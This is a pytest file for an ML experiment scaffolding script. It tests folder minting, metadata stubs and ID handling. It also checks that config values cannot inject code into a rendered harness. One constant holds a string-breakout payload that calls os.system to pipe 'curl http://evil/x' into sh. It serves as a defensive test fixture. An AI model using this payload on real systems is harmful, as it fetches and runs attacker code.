"""test_scaffold_experiment.py — mint exp-NNN + render the harness (EXP-01, D-02).

Exercises scaffold_experiment.py as a SUBPROCESS (the documented invocation contract),
mirroring the rest of the loop-script suite. The scaffolder is stdlib-only (it renders the
template but never executes ML code), so these run in the default offline suite.
"""

import ast
import json
from pathlib import Path

import pytest

from init_workspace import _render_text  # scripts/ is on sys.path (conftest)

# A slug/cv_scheme value crafted to break out of a Python string literal and run code
# the moment run_local.py executes the harness (CR-01). The fix must render it inert.
_INJECTION_PAYLOAD = 't"; import os; os.system("curl http://evil/x|sh"); _="'


def _seed_workspace(ws: Path, *, metric="roc_auc", cv_scheme="StratifiedKFold",
                    next_exp_id=1, slug="titanic"):
    """Create a minimal post-Phase-2 control-plane with metric + cv.scheme committed."""
    ctrl = ws / "control"
    ctrl.mkdir(parents=True, exist_ok=True)
    (ctrl / "config.json").write_text(
        json.dumps(
            {
                "workspace_version": 1,
                "competition_slug": slug,
                "execution_target": "local",
                "cv": {"scheme": cv_scheme},
                "metric": {"name": metric, "greater_is_better": True},
                "created": "2026-01-01T00:00:00Z",
            },
            indent=2,
        )
        + "\n"
    )
    (ctrl / "state.json").write_text(
        json.dumps({"credentials": "UNVALIDATED", "next_exp_id": next_exp_id}) + "\n"
    )
    (ctrl / "ledger.jsonl").write_text("")
    return ws


def _read_state(ws: Path):
    return json.loads((ws / "control" / "state.json").read_text())


def test_scaffold_mints_exp_001(run_script, tmp_path):
    ws = _seed_workspace(tmp_path)
    r = run_script(
        "scaffold_experiment.py", "--workspace", ws,
        "--idea", "LightGBM baseline on raw features",
        "--hypothesis", "GBDT beats a constant-rate baseline",
        cwd=ws,
    )
    assert r.returncode == 0, r.stderr
    exp = ws / "experiments" / "exp-001"
    assert (exp / "experiment.py").is_file()
    assert (exp / "meta.json").is_file()
    assert (exp / "artifacts").is_dir()
    assert _read_state(ws)["next_exp_id"] == 2


def test_minted_experiment_carries_helpers_and_registry_literal(run_script, tmp_path):
    ws = _seed_workspace(tmp_path, metric="roc_auc")
    r = run_script("scaffold_experiment.py", "--workspace", ws,
                   "--idea", "i", "--hypothesis", "h", cwd=ws)
    assert r.returncode == 0, r.stderr
    src = (ws / "experiments" / "exp-001" / "experiment.py").read_text()
    assert "def run_cv" in src
    assert "def resolve_data_dir" in src
    assert "registry_entry = {" in src
    # The rendered literal's sklearn_callable matches REGISTRY[config metric name].
    assert "roc_auc_score" in src


def test_minted_experiment_is_kernel_portable(run_script, tmp_path):
    ws = _seed_workspace(tmp_path)
    r = run_script("scaffold_experiment.py", "--workspace", ws,
                   "--idea", "i", "--hypothesis", "h", cwd=ws)
    assert r.returncode == 0, r.stderr
    src = (ws / "experiments" / "exp-001" / "experiment.py").read_text()
    assert "import metric_registry" not in src
    assert "from metric_registry" not in src


def test_meta_stub_fields(run_script, tmp_path):
    ws = _seed_workspace(tmp_path)
    r = run_script(
        "scaffold_experiment.py", "--workspace", ws,
        "--idea", 'idea with "quotes" and, commas',
        "--hypothesis", "the hypothesis",
        cwd=ws,
    )
    assert r.returncode == 0, r.stderr
    meta = json.loads((ws / "experiments" / "exp-001" / "meta.json").read_text())
    assert meta["exp_id"] == "exp-001"
    assert meta["idea"] == 'idea with "quotes" and, commas'
    assert meta["hypothesis"] == "the hypothesis"
    assert meta["created"]  # non-empty timestamp
    # Numeric result fields are null/empty in a stub — the recorder fills them (D-05).
    assert meta["metric"] is None
    assert meta["cv_mean"] is None
    assert meta["cv_std"] is None
    assert meta["n_folds"] is None
    assert meta["fold_scores"] == []


def test_second_scaffold_mints_exp_002_and_never_clobbers(run_script, tmp_path):
    ws = _seed_workspace(tmp_path)
    r1 = run_script("scaffold_experiment.py", "--workspace", ws,
                    "--idea", "first", "--hypothesis", "h1", cwd=ws)
    assert r1.returncode == 0, r1.stderr
    first_bytes = (ws / "experiments" / "exp-001" / "experiment.py").read_bytes()

    r2 = run_script("scaffold_experiment.py", "--workspace", ws,
                    "--idea", "second", "--hypothesis", "h2", cwd=ws)
    assert r2.returncode == 0, r2.stderr
    assert (ws / "experiments" / "exp-002" / "experiment.py").is_file()
    assert _read_state(ws)["next_exp_id"] == 3
    # exp-001 is never re-consumed or overwritten (D-02 idempotency).
    assert (ws / "experiments" / "exp-001" / "experiment.py").read_bytes() == first_bytes


def _slug_literal_value(src: str):
    """Extract the value SLUG binds to in the rendered harness (None if not a literal)."""
    tree = ast.parse(src)  # raises SyntaxError if a value broke out of its literal
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign) and any(
            isinstance(t, ast.Name) and t.id == "SLUG" for t in node.targets
        ):
            return ast.literal_eval(node.value)
    return None


def test_injection_slug_and_cv_render_as_inert_literals(run_script, tmp_path):
    """CR-01: a slug/cv_scheme carrying a `"`+payload must render as an INERT string
    literal (repr-quoted), so the generated experiment.py still parses and never executes
    the payload. Renders the template directly to exercise the repr() rendering itself —
    the primary defense — independent of the scaffold-level charset gate."""
    src = _render_text(
        "experiment.py.tmpl",
        {
            "slug_literal": repr(_INJECTION_PAYLOAD),
            "exp_id_literal": repr("exp-001"),
            "exp_dir_literal": repr("experiments/exp-001"),
            "cv_scheme_literal": repr(_INJECTION_PAYLOAD),
            "metric_name_literal": repr("roc_auc"),
            "registry_entry": repr({"range": (0, 1), "sklearn_callable": "roc_auc_score"}),
        },
    )
    # The rendered harness parses as valid Python — the payload never broke out.
    slug_val = _slug_literal_value(src)
    # SLUG binds to the payload verbatim, as an inert string (not executed code).
    assert slug_val == _INJECTION_PAYLOAD
    # The payload never appears as a bare (executable) statement — os.system stays
    # inside the string literal, never a top-level call node.
    tree = ast.parse(src)
    top_level_calls = [
        n for n in tree.body
        if isinstance(n, ast.Expr) and isinstance(n.value, ast.Call)
    ]
    assert top_level_calls == []


def test_scaffold_blocks_malicious_slug(run_script, tmp_path):
    """CR-01 defense-in-depth: a malformed (injection-shaped) slug is blocked at scaffold
    (block, don't guess) and NOTHING is minted."""
    ws = _seed_workspace(tmp_path, slug=_INJECTION_PAYLOAD)
    r = run_script("scaffold_experiment.py", "--workspace", ws,
                   "--idea", "i", "--hypothesis", "h", cwd=ws)
    assert r.returncode != 0
    assert not (ws / "experiments" / "exp-001").exists()
    # The id cursor never advanced (nothing was consumed).
    assert _read_state(ws)["next_exp_id"] == 1


def test_scaffold_blocks_unknown_cv_scheme(run_script, tmp_path):
    """CR-01 defense-in-depth: a cv scheme outside the allowed enum is blocked before it
    can be rendered into the executed harness."""
    ws = _seed_workspace(tmp_path, cv_scheme='K"; import os')
    r = run_script("scaffold_experiment.py", "--workspace", ws,
                   "--idea", "i", "--hypothesis", "h", cwd=ws)
    assert r.returncode != 0
    assert not (ws / "experiments" / "exp-001").exists()


def test_corrupt_state_json_is_left_intact_and_blocks(run_script, tmp_path):
    ws = _seed_workspace(tmp_path)
    corrupt = "{ this is not valid json"
    (ws / "control" / "state.json").write_text(corrupt)
    r = run_script("scaffold_experiment.py", "--workspace", ws,
                   "--idea", "i", "--hypothesis", "h", cwd=ws)
    assert r.returncode != 0
    # Bytes untouched (fail-clear) and no experiment folder was created.
    assert (ws / "control" / "state.json").read_text() == corrupt
    assert not (ws / "experiments" / "exp-001").exists()
